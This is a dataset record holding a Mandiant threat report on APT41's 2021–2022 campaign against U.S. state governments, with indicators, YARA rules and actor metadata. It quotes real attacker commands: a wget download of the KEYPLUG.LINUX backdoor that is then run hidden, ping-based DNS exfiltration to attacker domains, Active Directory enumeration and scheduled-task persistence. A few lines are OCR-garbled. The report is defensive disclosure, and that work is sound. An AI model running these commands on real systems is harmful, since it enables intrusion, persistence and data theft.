{
    "id": "5ac2ea4c-a86f-4f1f-8f96-a493fea84e5b",
    "created_at": "2022-10-25T16:48:24.603097Z",
    "updated_at": "2025-03-27T02:16:17.009474Z",
    "deleted_at": null,
    "sha1_hash": "4625a11ec7fb6b97ac5e4882aec5c1a143483bef",
    "title": "A Summary of APT41 Targeting U.S. State Governments",
    "authors": "Mandiant",
    "file_creation_date": "2022-03-10T18:39:35Z",
    "file_modification_date": "2022-03-10T18:39:35Z",
    "file_size": 1286496,
    "plain_text": "# Does This Look Infected? A Summary of APT41 Targeting U.S. State Governments\n\n**mandiant.com/resources/apt41-us-state-governments**\n\n_UPDATE (Mar. 8): The original post may not have provided full clarity that CVE-2021-44207 (USAHerds) had a patch developed by Acclaim_\n_Systems for applicable deployments on or around Nov. 15, 2021. Mandiant cannot speak to the affected builds, deployment, adoption, or_\n_other technical factors of this vulnerability patch beyond its availability._\n\nIn May 2021 Mandiant responded to an APT41 intrusion targeting a United States state government computer network. This was just the\nbeginning of Mandiant’s insight into a persistent months-long campaign conducted by APT41 using vulnerable Internet facing web applications\nas their initial foothold into networks of interest. APT41 is a prolific Chinese state-sponsored espionage group known to target organizations in\n[both the public and private sectors and also conducts financially motivated activity for personal gain.](https://www.mandiant.com/resources/apt41-dual-espionage-and-cyber-crime-operation)\n\nIn this blog post, we detail APT41’s persistent effort that allowed them to successfully compromise at least six U.S. state government networks\nby exploiting vulnerable Internet facing web applications, including using a zero-day vulnerability in the USAHerds application (CVE-202144207) as well as the now infamous zero-day in Log4j (CVE-2021-44228). While the overall goals of APT41's campaign remain unknown, our\ninvestigations into each of these intrusions has revealed a variety of new techniques, malware variants, evasion methods, and capabilities.\n\n## Campaign Overview\n\n[Although APT41 has historically performed mass scanning and exploitation of vulnerabilities, our investigations into APT41 activity between](https://www.mandiant.com/resources/apt41-initiates-global-intrusion-campaign-using-multiple-exploits)\nMay 2021 and February 2022 uncovered evidence of a deliberate campaign targeting U.S. state governments. During this timeframe, APT41\nsuccessfully compromised at least six U.S. state government networks through the exploitation of vulnerable Internet facing web applications,\noften written in ASP.NET. In most of the web application compromises, APT41 conducted .NET deserialization attacks; however, we have also\nobserved APT41 exploiting SQL injection and directory traversal vulnerabilities.\n\nIn the instance where APT41 gained access through a SQL injection vulnerability in a proprietary web application, Mandiant Managed Defense\nquickly detected and contained the activity; however, two weeks later APT41 re-compromised the network by exploiting a previously unknown\nzero-day vulnerability in a commercial-off-the-shelf (CoTS) application, USAHerds. In two other instances, Mandiant began an investigation at\none state agency only to find that APT41 had also compromised a separate, unrelated agency in the same state.\n\nAPT41 was also quick to adapt and use publicly disclosed vulnerabilities to gain initial access into target networks, while also maintaining\n[existing operations. On December 10th, 2021, the Apache Foundation released an advisory for a critical remote code execution (RCE)](https://logging.apache.org/log4j/2.x/security.html)\nvulnerability in the commonly used logging framework Log4J. Within hours of the advisory, APT41 began exploiting the vulnerability to later\ncompromise at least two U.S. state governments as well as their more traditional targets in the insurance and telecommunications industries.\n\nIn late February 2022, APT41 re-compromised two previous U.S. state government victims. Our ongoing investigations show the activity\nclosely aligns with APT41's May-December 2021 activity, representing a continuation of their campaign into 2022 and demonstrating their\nunceasing desire to access state government networks. A timeline of representative intrusions from this campaign can be seen in Figure 1.\n\nFigure 1: U.S. state government campaign timeline\n\nThe goals of this campaign are currently unknown, though Mandiant has observed evidence of APT41 exfiltrating Personal Identifiable\nInformation (PII). Although the victimology and targeting of PII data is consistent with an espionage operation, Mandiant cannot make a\ndefinitive assessment at this time given APT41’s history of moonlighting for personal financial gain.\n\n## Exploitation of Deserialization Vulnerabilities\n\n[APT41 has primarily used malicious ViewStates to trigger code execution against targeted web applications. Within the ASP.NET framework,](https://docs.microsoft.com/en-us/previous-versions/aspnet/bb386448(v=vs.100))\nViewState is a method for storing the application’s page and control values in HTTP requests to and from the server. The ViewState is sent to\nthe server with each HTTP request as a Base64 encoded string in a hidden form field. The web server decodes the string and applies additional\ntransformations to the string so that it can be unpacked into data structures the server can use. This process is known as deserialization.\n\n[Insecure deserialization of user-supplied input can result in code execution. ASP.NET has several insecure deserialization providers, including](https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide)\n[the one used for ViewStates: ObjectStateFormatter. To prevent a threat actor from manipulating the ViewState and taking advantage of the](https://docs.microsoft.com/en-us/dotnet/api/system.web.ui.objectstateformatter)\ninsecure deserialization provider, the ViewState is protected by a Message Authentication Code (MAC). This MAC is a cryptographically signed\n\n\n-----\n\nas va ue t at t e se ve uses to e su e t at t e V ewState as ot bee ta pe ed w t, poss b y to t gge code e ecut o . e teg ty o t e\nViewState depends on the application’s machineKey remaining confidential. The machineKey is stored on the application server in a\nconfiguration file named web.config.\n```\n <machineKey validationKey=\"XXXXXXXXXXXXXXXXX\" decryptionKey=\"XXXXXXXXXXXXXXXXXXXXXX\" validation=\"SHA1\" />\n\n```\nFigure 2 Sample machineKey attribute from a web.config file\n\nA threat actor with knowledge of the machineKey can construct a malicious ViewState and then generate a new and valid MAC that the server\naccepts. With a valid MAC, the server will then deserialize the malicious ViewState, resulting in the execution of code on the server. Publicly\n[available tools such as YSoSerial.NET exist to construct these malicious ViewStates. This is precisely how APT41 initiated their campaign in](https://github.com/pwntester/ysoserial.net)\nMay 2021.\n\n### Proprietary Web Application Targeting\n\nIn June 2020, one year before APT41 began this campaign, Mandiant investigated an incident where APT41 exploited a directory traversal\nvulnerability specifically to read the web.config file for a vulnerable web application on a victim web server. APT41 then used the machineKey\nvalues from the web.config file to generate a malicious ViewState payload for a deserialization exploit. Mandiant did not identify how APT41\noriginally obtained the machineKey values for the proprietary application exploited in May 2021 or the USAHerds application, which was first\nexploited in July 2021. However, it is likely that APT41 obtained the web.config file through similar means.\n\nTo craft malicious ViewStates, APT41 relied on the publicly available Github project YSoSerial.NET. In order to successfully load arbitrary\n.NET assemblies into memory, APT41 set the DisableActivitySurrogateSelectorTypeCheck property flag to true within the\nConfigurationManager.AppSettings class of the running application via the ViewState payload. APT41 subsequently loaded .NET assemblies\ninto memory using additional YSoSerial payloads configured to write webshells to a hardcoded filepath on disk.\n\nFigure 3: Deserialized .NET Assembly (dnSpy)\n\nFigure 4 shows an example JScript webshell deployed through a malicious ViewState object by APT41 which utilizes Code Page 936 for the\nChinese Simplified keyboard language.\n\nFigure 4: Deserialized JScript Webshell\n\n[For additional information regarding deserialization exploits and our new hunting rule generation tool ‘HeySerial’, read our blog post, Now](https://github.com/mandiant/heyserial)\nYou Serial, Now You Don’t — Systematically Hunting for Deserialization Exploits.\n\n### USAHerds (CVE-2021-44207) Zero-Day\n\n[In three investigations from 2021, APT41 exploited a zero-day vulnerability in the USAHerds web application. USAHerds is a CoTS application](https://www.tnatc.org/assets/downloads/USAHerds-2019-05-01.pdf)\nwritten in ASP.NET and used by 18 states for animal health management. The vulnerability in USAHerds (CVE-2021-44207) is similar to a\n[previously reported vulnerability in Microsoft Exchange Server (CVE-2020-0688), where the applications used a static validationKey and](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)\ndecryptionKey (collectively known as the machineKey) by default. As a result, all installations of USAHerds shared these values, which is\nagainst the best practice of using uniquely generated machineKey values per application instance.\n\nGenerating unique machineKey values is critical to the security of an ASP.NET web application because the values are used to secure the\nintegrity of the ViewState.\n\n\n-----\n\na d a t d d ot de t y ow 4 o g a y obta ed t e ac e ey va ues o US e ds; oweve, o ce 4 obta ed t e\nmachineKey, they were able to compromise any server on the Internet running USAHerds. As a result, there are potentially additional\nunknown victims.\n\n### Log4j (CVE-2021-44228)\n\nThe most recent APT41 campaign began shortly after the release of CVE-2021-44228 and its related proof-of-concept exploits in December\n2021. Exploiting this vulnerability, also known as Log4Shell, causes Java to fetch and deserialize a remote Java object, resulting in potential\ncode execution. Similar to their previous web application targeting, APT41 continued to use YSoSerial generated deserialization payloads to\n[perform reconnaissance and deploy backdoors. Notably, APT41 deployed a new variant of the KEYPLUG backdoor on Linux servers at multiple](https://advantage.mandiant.com/malware/malware--4484e24c-fbf7-5894-90e2-4c6ed949ec6c)\n[victims, a malware sub-family we now track as KEYPLUG.LINUX. KEYPLUG is a modular backdoor written in C++ that supports multiple](https://advantage.mandiant.com/malware/malware--e9079969-5b46-5218-9915-3a6ebc566489)\nnetwork protocols for command and control (C2) traffic including HTTP, TCP, KCP over UDP, and WSS. APT41 heavily used the Windows\nversion of the KEYPLUG backdoor at state government victims between June 2021 and December 2021, thus the deployment of a ported\nversion of the backdoor closely following the state government campaign was significant.\n\nAfter exploiting Log4Shell, APT41 continued to use deserialization payloads to issue ping commands to domains, a technique APT41 frequently\nused at government victims months prior. An example ping command is shown in Figure 5.\n```\n ping -c 1 libxqagv[.]ns[.]dns3[.]cf              \n\n```\nFigure 5: Ping Command to Attacker Controlled Infrastructure\n\nUpon gaining access to a target environment, APT41 performed host and network reconnaissance before deploying KEYPLUG.LINUX to\nestablish a foothold in the environment. Sample commands used to deploy KEYPLUG.LINUX can be seen in Figure 6.\n```\n wget http://103.224.80[.]44:8080/kernel            \n\n```\n```\nchmod 777 kernel\nmv kernel .kernel\nnohup ./.kernel &\n\n```\n\nFigure 6: Deployment of KEYPLUG.LINUX Following Log4j Exploitation\n\n## “All Killer No Filler” Intrusion TTPs\n\nThe updated tradecraft and new malware continue to show APT41 is a highly adaptable and resourceful actor. In this section, we detail the\nmost pertinent post-compromise techniques.\n\n### Reconnaissance\n\nAfter gaining initial access to an internet-facing server, APT41 performed extensive reconnaissance and credential harvesting. A common tactic\n[seen is the deployment of a ConfuserEx obfuscated BADPOTATO binary to abuse named pipe impersonation for local NT](https://yck1509.github.io/ConfuserEx/#:~:text=ConfuserEx%20is%20an%20free%2C%20open,Graphical%20interface)\nAUTHORITY\\SYSTEM privilege escalation. Once APT41 escalated to NT AUTHORITY\\SYSTEM privileges, they copied the local SAM and\n[SYSTEM registry hives to a staging directory for credential harvesting and exfiltration. APT41 has additionally used Mimikatz to execute the](https://advantage.mandiant.com/reports/17-00001506)\nlsadump::sam command on the dumped registry hives to obtain locally stored credentials and NTLM hashes.\n\nAPT41 also conducted Active Directory reconnaissance by uploading the Windows command-line tool dsquery.exe (MD5:\n49f1daea8a115dd6fce51a1328d863cf) and its associated module dsquery.dll (MD5: b108b28138b93ec4822e165b82e41c7a) to a staging\ndirectory on the compromised server. Figure 7 shows multiple dsquery commands used to enumerate various Active Directory objects within\nthe environment.\n```\n c:\\programdata\\dsquery.exe * -filter \"(objectCategory=Person)\" -attr cn title displayName description department\n company sAMAccountName mail mobile telephoneNumber whenCreated whenChanged logonCount badPwdCount distinguishedName\n -L -limit 0\n c:\\programdata\\dsquery.exe * -filter \"(objectCategory=Computer)\" -attr cn operatingSystem\n operatingSystemServicePack operatingSystemVersion dNSHostName whenCreated whenChanged lastLogonTimestamp\n distinguishedName description managedBy mS-DS-CreatorSID -limit 0\n c:\\programdata\\dsquery.exe * -filter \"(objectCategory=Computer)\" -attr cnservicePrincipalName -L -limit 0\n\n```\n```\nc:\\programdata\\dsquery.exe * -filter \"(objectCategory=Group)\" -uc -attr cn sAMAccountName distinguishedName\ndescription -limit 0\nc:\\programdata\\dsquery.exe * -filter \"(objectClass=organizationalUnit)\" -attr ou name whenCreated\ndistinguishedName gPLink -limit 0\n\n```\nFigure 7: dsquery Active Directory Reconnaissance Commands\n\n\n-----\n\nDuring the early stage of one U.S. state government intrusion, Mandiant identified a new malware family used by APT41 we track as\nDUSTPAN. DUSTPAN is an in-memory dropper written in C++ that leverages ChaCha20 to decrypt embedded payloads. Different variations\nof DUSTPAN may also load and execute a payload from a hard-coded filepath encrypted in the binary. DUSTPAN is consistent with the\n[publicly named StealthVector, reported by Trend Micro in August 2021. During the intrusion, DUSTPAN was used to drop a Cobalt Strike](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/earth-baku-returns)\nBEACON backdoor.\n\n### Anti-Analysis\n\n[APT41 continues to leverage advanced malware in their existing toolkit, such as the DEADEYE launcher and LOWKEY backdoor, with added](https://www.mandiant.com/resources/lowkey-hunting-missing-volume-serial-id)\ncapabilities and anti-analysis techniques to hinder investigations. During a recent intrusion Mandiant identified a new malware variant,\n[DEADEYE.EMBED, contained in an Alternate Data Stream of a local file. DEADEYE.EMBED variants embed the payload inside of the](https://advantage.mandiant.com/malware/malware--826fd422-6e98-5ea9-82c1-0cf54072658f)\ncompiled binary rather than appended to the overlay at the end of the file, as seen in DEADEYE.APPEND.\n\nAPT41 commonly packages their malware with VMProtect to slow reverse engineering efforts. During multiple U.S. state government\nintrusions, APT41 incorporated another anti-analysis technique by chunking a VMProtect packaged DEADEYE binary into multiple sections on\ndisk. Breaking the binary into multiple files reduces the chance that all samples can be successfully acquired during a forensic investigation.\nCommon file naming conventions used by APT41 when deploying DEADEYE on victim hosts can be seen in Figure 8.\n\nFigure 8: DEADEYE Filenames\n\nThese files would then be combined into a single DLL before execution as seen in Figure 9.\n```\n \"cmd\" /c copy /y /b C:\\Users\\public\\syslog_6-*.dat C:\\Users\\public\\syslog.dll\n\n```\nFigure 9: DEADEYE Command to concatenate DEADEYE sections\n\nIn addition to separating their VMProtect packaged malware on disk, APT41 changed the standard VMProtect section names (.vmp) to UPX\nsection names (.upx). By doing so, the malware could evade basic hunting detections that flag binaries packaged with VMProtect. During Log4j\nexploitation, APT41 similarly chunked a KEYPLUG.LINUX binary into four separate files named “xaa”, ” xab”, ” xac”, and ”xad”. APT41 also\npackaged the KEYPLUG.LINUX binary with VMProtect and used UPX section names. This technique is very low in prevalence across our\nmalware repository, and even lower in prevalence when searching across ELF files.\n\n[APT41 also updated the DEADEYE execution guardrail capabilities used during the campaign. Guardrailing is a technique used by malware to](https://attack.mitre.org/techniques/T1480/)\nensure that the binary only executes on systems that the threat actor intended. DEADEYE samples from older campaigns used the victim\n[computer’s volume serial number but they have since been updated to use the hostname and/or DNS domain during the U.S. state government](https://www.mandiant.com/resources/lowkey-hunting-missing-volume-serial-id)\ncampaign. To acquire the local computer’s hostname and DNS domain, DEADEYE executes the WinAPI functions GetComputerNameA and/or\nGetComputerNameExA and provides it as input for a generated decryption key.\n\n### Persistence\n\nAPT41 continues to leverage advanced tradecraft to remain persistent and undetected. In multiple instances, the Windows version of the\n[KEYPLUG backdoor leveraged dead drop resolvers on two separate tech community forums. The malware fetches its true C2 address from](https://attack.mitre.org/techniques/T1102/001/)\nencoded data on a specific forum post. Notably, APT41 continues to update the community forum posts frequently with new dead drop\nresolvers during the campaign. APT41 has historically used this unique tradecraft during other intrusions to help keep their C2 infrastructure\nhidden.\n\nTo persist execution of DEADEYE, APT41 has leveraged the schtasks /change command to modify existing scheduled tasks that run under the\ncontext of SYSTEM. APT41 commonly uses the living off the land binary (lolbin) shell32.dll!ShellExec_RunDLLA in scheduled tasks for binary\nexecution, such as the example shown in Figure 10.\n```\n SCHTASKS /Change /tn \"\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\" /TR\n \"C:\\windows\\system32\\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\\windows\\system32\\msiexec.exe /Z\n c:\\programdata\\S-1-5-18.dat\" /RL HIGHEST /RU \"\" /ENABLE\n\n```\nFigure 10: Modified Scheduled Task\n\nAPT41 has leveraged the following Windows scheduled tasks for persistence of DEADEYE droppers in U.S. state government intrusions:\n\n```\n\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\n\n```\n\n-----\n\n```\n\\ c oso t\\ do s\\ as\\ a age ob ty\n\n```\n\nAnother technique APT41 used to launch malware is through the addition of a malicious import to the Import Address Table (IAT) of legitimate\nWindows PE binaries. As a result, once the legitimate binary is executed, it will load the malicious library and call its DllEntryPoint. A modified\nIAT of a legitimate Microsoft HealthService.exe binary can be seen in Figure 11.\n\nFigure 11: Modified IAT (CFF Explorer)\n\n[APT41 continues to tailor their malware to victim environments through their stealthy passive backdoor LOWKEY.PASSIVE. During one](https://advantage.mandiant.com/reports/21-00017779)\nintrusion, APT41 exploited a USAHerds server and subsequently executed DEADEYE.APPEND which dropped LOWKEY.PASSIVE in-memory.\nThe identified LOWKEY.PASSIVE sample listened for incoming connections that request either of the following URL endpoints:\n```\n   http://<HOST:PORT>/USAHerds/Common/%s.css\n   https://<HOST:PORT>/USAHerds/Common/%s.css\n\n```\nAPT41 frequently configured LOWKEY.PASSIVE URL endpoints to masquerade as normal web application traffic on an infected server.\n\n### “It’s Always Cloudy in Chengdu” — Cloudflare Usage\n\nAPT41 has substantially increased their usage of Cloudflare services for C2 communications and data exfiltration. Specifically, APT41 leveraged\n[Cloudflare Workers to deploy serverless code accessible through the Cloudflare CDN which helps proxy C2 traffic to APT41 operated](https://workers.cloudflare.com/)\ninfrastructure.\n\nAt multiple victims, APT41 issued ping commands where the output of a reconnaissance command was prepended to subdomains of Cloudflare\nproxied infrastructure. Once the ping command was executed, the local DNS resolver attempted to resolve the fabricated domain containing\nthe prepended command output. The forward DNS lookup eventually reached the primary domain's Cloudflare name servers, which were\nunable to resolve an IP address for the fabricated domain. However, the DNS activity logs of the attacker-controlled domain recorded the DNS\nlookup of the subdomain, allowing the group to collect the reconnaissance command output.\n\nExamples of this technique can be seen in Figure 12 to Figure 15.\n```\n $a=whoami;ping ([System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($a)).replace('-','')+\"\"\n [.]ns[.]time12[.]cf\"\")\n\n```\nFigure 12: Reconnaissance Exfiltration\n```\n cmd.exe /c ping %userdomain%[.]ns[.]time12[.]cf\n\n```\nFigure 13: Reconnaissance Exfiltration\n\nIn Figure 14, APT41 issued a command to find the volume serial number of the system, which has historically been used as the decryption key\nfor DEADEYE payloads.\n```\n ping -n 1 ((cmd /c dir c:\\|findstr Number).split()[-1]+'.ns[.]time12[.]cf\n\n```\nFigure 14: Volume Serial Number Exfiltration\n\n\n-----\n\nt s ast e a p e, t e co a d p ts t e e gt o t e e sys og_6 .dat, e y to e su e t as bee u y w tte to d s p o to\ncombining the multiple files into the full malicious executable.\n```\n ping -n 1 ((ls C:\\Users\\public\\syslog_6-1.dat).Length.ToString()+\"\".ns[.]time12[.]cf\"\")\n\n```\nFigure 15: File Size Exfiltration\n\nAPT41 leveraged the aforementioned technique for further data exfiltration by hex encoding PII data and prepending the results as\nsubdomains of the attacker-controlled domain. The resulting DNS lookups triggered by the ping commands would be recorded in the activity\nlogs and available to APT41.\n\n[APT41’s continued usage of Cloudflare services is further exemplified in recently developed KEYPLUG samples. Mandiant identified a unique](https://advantage.mandiant.com/malware/malware--4484e24c-fbf7-5894-90e2-4c6ed949ec6c)\n[capability added to KEYPLUG that leverages the WebSocket over TLS (WSS) protocol for C2 communication. According to Cloudflare,](https://support.cloudflare.com/hc/en-us/articles/200169466-Using-Cloudflare-with-WebSockets#12345681)\nWebSocket traffic can be established through the Cloudflare CDN edge servers, which will proxy data through to the specified origin server.\n\nKEYPLUG includes a hardcoded one-byte XOR encoded configuration file that lists the specific communication protocol, servers, and\nadditional settings. After KEYPLUG decodes the hardcoded configuration file at runtime, it will parse the configuration to determine the\nappropriate network protocol and servers to use for command and control. After the configuration is parsed, KEYPLUG randomly chooses a\nCIDR block from the list then randomly chooses an IP address within the CIDR block based on the current tick count of the infected computer.\n\nFigure 16 details an example configuration file identified during a recent U.S. state government intrusion.\n```\n WSS://104.24.0.0/14;103.22.200.0/22;103.21.244.0/22:443|7600|5|1|afdentry.workstation.eu.org:443\n\n```\nFigure 16: KEYPLUG Configuration\n\nThe CIDR blocks listed in Figure 16 are Cloudflare CDN associated infrastructure that will redirect the WSS connection to the malicious\ndomain afdentry[.]workstation[.]eu[.]org.\n\nFigure 17 is an example HTTP request sent by KEYPLUG to initiate and upgrade to the WSS protocol using Cloudflare infrastructure.\n\nFigure 17: KEYPLUG HTTP Upgrade Request\n\nWe notified Cloudflare of this malicious activity and they took prompt action to disrupt communications to the malicious infrastructure.\nAPT41’s increased usage of Cloudflare services indicates a desire to leverage Cloudflare’s flexibility and deter identification and blocking of\ntheir true C2 servers.\n\n## Outlook\n\nAPT41's recent activity against U.S. state governments consists of significant new capabilities, from new attack vectors to post-compromise\ntools and techniques. APT41 can quickly adapt their initial access techniques by re-compromising an environment through a different vector,\nor by rapidly operationalizing a fresh vulnerability. The group also demonstrates a willingness to retool and deploy capabilities through new\nattack vectors as opposed to holding onto them for future use. APT41 exploiting Log4J in close proximity to the USAHerds campaign showed\nthe group’s flexibility to continue targeting U.S state governments through both cultivated and co-opted attack vectors. Through all the new,\n[some things remain unchanged: APT41 continues to be undeterred by the U.S. Department of Justice (DOJ) indictment in September 2020.](https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer)\n\n## Indicators\n\n**Malware Family** **MD5** **SHA1** **SHA256**\n\nKEYPLUG.LINUX 900ca3ee85dfc109baeed4888ccb5d39 355b3ff61db44d18003537be8496eb03536e300f e024ccc4c72eb5813cc2b6db7\n\nKEYPLUG.LINUX b82456963d04f44e83442b6393face47 996aa691bbc1250b571a2f5423a5d5e2da8317e6 d7e8cc6c19ceebf0e125c9f18b\n\nDSQUERY 49f1daea8a115dd6fce51a1328d863cf e85427af661fe5e853c8c9398dc46ddde50e2241 ebf28e56ae5873102b51da2cc\n\nDSQUERY b108b28138b93ec4822e165b82e41c7a 7056b044f97e3e349e3e0183311bb44b0bc3464f 062a7399100454c7a523a9382\n\nBADPOTATO 143278845a3f5276a1dd5860e7488313 6f6b51e6c88e5252a2a117ca1cfb57934930166b a4647fcb35c79f26354c34452e\n\n\n-----\n\n**Context** **Indicator(s)**\n\nU.S. State Government Campaign – USAHerds (CVE-2021-44207) Exploitation 194[.]195[.]125[.]121\n\n194[.]156[.]98[.]12\n\n54[.]248[.]110[.]45\n\n45[.]153[.]231[.]31\n\n185[.]118[.]167[.]40\n\n104[.]18[.]6[.]251\n\n104[.]18[.]7[.]251\n\n20[.]121[.]42[.]11\n\n34[.]139[.]13[.]46\n\n54[.]80[.]67[.]241\n\n149[.]28[.]15[.]152\n\n18[.]118[.]56[.]237\n\n107[.]172[.]210[.]69\n\n172[.]104[.]206[.]48\n\n67[.]205[.]132[.]162\n\n45[.]84[.]1[.]181\n\ncdn[.]ns[.]time12[.]cf\n\neast[.]winsproxy[.]com\n\nafdentry[.]workstation[.]eu[.]org\n\nns1[.]entrydns[.]eu[.]org\n\nsubnet[.]milli-seconds[.]com\n\nwork[.]viewdns[.]ml\n\nwork[.]queryip[.]cf\n\nLog4j (CVE-2021-44228) Exploitation 103[.]238[.]225[.]37\n\n182[.]239[.]92[.]31\n\nmicrosoftfile[.]com\n\ndown-flash[.]com\n\nlibxqagv[.]ns[.]dns3[.]cf\n\n## Detections\n\n\n-----\n\n```\nrule M_APT_Backdoor_KEYPLUG_MultiXOR_Config\n{\n\n```\n```\n  meta:\n    author = \"Mandiant\"\n\n```\n```\n    description = \"Matches KEYPLUG XOR-encoded configurations. Locates multiple values of: TCP://, UDP://,\nWSS://, +http and their pipe-deliminated variant: |TCP://, |UDP://, |WSS://, |+http. Requires at least one instance\nof 00| in the encoded configuration which corresponds to the sleep value. Removed instances where double-NULLs were\npresent in the generated strings to reduce false positives.\"\n  strings:\n\n```\n```\n    // TCP\n    $tcp1  = \"TCP://\" xor(0x01-0x2E)\n    $tcp2  = \"TCP://\" xor(0x30-0xFF)\n    $ptcp1 = \"|TCP://\" xor(0x01-0x2E)\n    $ptcp2 = \"|TCP://\" xor(0x30-0xFF)\n\n```\n```\n    // UDP\n    $udp1  = \"UDP://\" xor(0x01-0x2E)\n    $udp2  = \"UDP://\" xor(0x30-0xFF)\n    $pudp1 = \"|UDP://\" xor(0x01-0x2E)\n    $pudp2 = \"|UDP://\" xor(0x30-0xFF)\n\n```\n```\n    // WSS\n    $wss1  = \"WSS://\" xor(0x01-0x2E)\n    $wss2  = \"WSS://\" xor(0x30-0x52)\n    $wss3  = \"WSS://\" xor(0x54-0xFF)\n    $pwss1 = \"|WSS://\" xor(0x01-0x2E)\n    $pwss2 = \"|WSS://\" xor(0x30-0x52)\n    $pwss3 = \"|WSS://\" xor(0x54-0xFF)\n\n```\n```\n    // HTTP\n    $http1 = \"+http\"  xor(0x01-0x73)\n    $http2 = \"+http\"  xor(0x75-0xFF)\n    $phttp1 = \"|+http\" xor(0x01-0x73)\n    $phttp2 = \"|+http\" xor(0x75-0xFF)\n\n```\n```\n    // Sleep value\n    $zeros1 = \"00|\"   xor(0x01-0x2F)\n    $zeros2 = \"00|\"   xor(0x31-0xFF)\n\n```\n```\n  condition:\n    filesize < 10MB and\n\n```\n```\n    (uint32(0) == 0x464c457f or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)) and\n    for any of ($tcp*,$udp*,$wss*,$http*): (# == 2 and @[2] - @[1] < 200) and\n\n```\n```\n    for any of ($ptcp*,$pudp*,$pwss*,$phttp*): (# == 1) and\n    any of ($zeros*)\n\n```\n```\n}\n\n```\n\n-----\n\n```\nrule M_Hunting_MSIL_BADPOTATO\n{\n\n```\n```\n  meta:\n    author = \"Mandiant\"\n\n```\n```\n    description = \"Hunting for BADPOTATO samples based on default strings found on the PE VERSIONINFO\nresource.\"\n  strings:\n\n```\n```\n    $dotnetdll = \"\\x00_CorDllMain\\x00\"\n    $dotnetexe = \"\\x00_CorExeMain\\x00\"\n    $s1 = { 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00 69 00 70 00 74 00 69 00 6F 00 6E 00 00 00 00\n00 42 00 61 00 64 00 50 00 6F 00 74 00 61 00 74 00 6F 00 }\n    $s2 = { 49 00 6E 00 74 00 65 00 72 00 6E 00 61 00 6C 00 4E 00 61 00 6D 00 65 00 00 00 42 00 61 00 64 00 50\n00 6F 00 74 00 61 00 74 00 6F 00 2E 00 65 00 78 00 65 00 }\n    $s3 = { 4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00 00\n00 42 00 61 00 64 00 50 00 6F 00 74 00 61 00 74 00 6F 00 2E 00 65 00 78 00 65 00 }\n    $s4 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 42 00 61 00 64 00 50\n00 6F 00 74 00 61 00 74 00 6F 00 }\n\n```\n```\n  condition:\n    (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and 1 of ($dotnet*) and 1 of ($s*)\n\n```\n```\n }\n\n## Acknowledgements\n\n```\nWe would like to thank our incident response consultants, Managed Defense responders, and FLARE reverse engineers who enable this\nresearch. In addition, we would like to thank Alyssa Rahman, Dan Perez, Ervin Ocampo, Blaine Stancill, and Nick Richard for their technical\nreviews.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/jtahutqqimavakqi7ynau7sdxrvrsw3s"
    ],
    "report_names": [
        "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bbefc37d-475c-4d4d-b80b-7a55f896de82",
            "created_at": "2022-10-25T15:50:23.571783Z",
            "updated_at": "2025-03-27T02:00:55.502112Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "BRONZE BUTLER",
                "REDBALDKNIGHT"
            ],
            "source_name": "MITRE:BRONZE BUTLER",
            "tools": [
                "Mimikatz",
                "build_downer",
                "cmd",
                "ABK",
                "at",
                "BBK",
                "schtasks",
                "down_new",
                "Daserf",
                "ShadowPad",
                "Windows Credential Editor",
                "gsecdump"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "4c68ccd0-caba-4189-9ead-86ac4c2d9b70",
            "created_at": "2024-05-01T02:03:07.930196Z",
            "updated_at": "2025-03-27T02:05:17.251237Z",
            "deleted_at": null,
            "main_name": "BRONZE ATLAS",
            "aliases": [
                "Axiom",
                "BARIUM ",
                "Blackfly ",
                "CTG-2633",
                "GREF",
                "Group 72 ",
                "Red Kelpie ",
                "TG-2633 ",
                "Wicked Panda ",
                "Winnti",
                "APT41 "
            ],
            "source_name": "Secureworks:BRONZE ATLAS",
            "tools": [
                " CCleaner v5.33 backdoor",
                " ChinaChopper",
                " Cobalt Strike",
                " Dicey MSDN",
                " ForkPlayground",
                " HUC Proxy Malware (Htran)",
                " Mimikatz",
                " PipeMon",
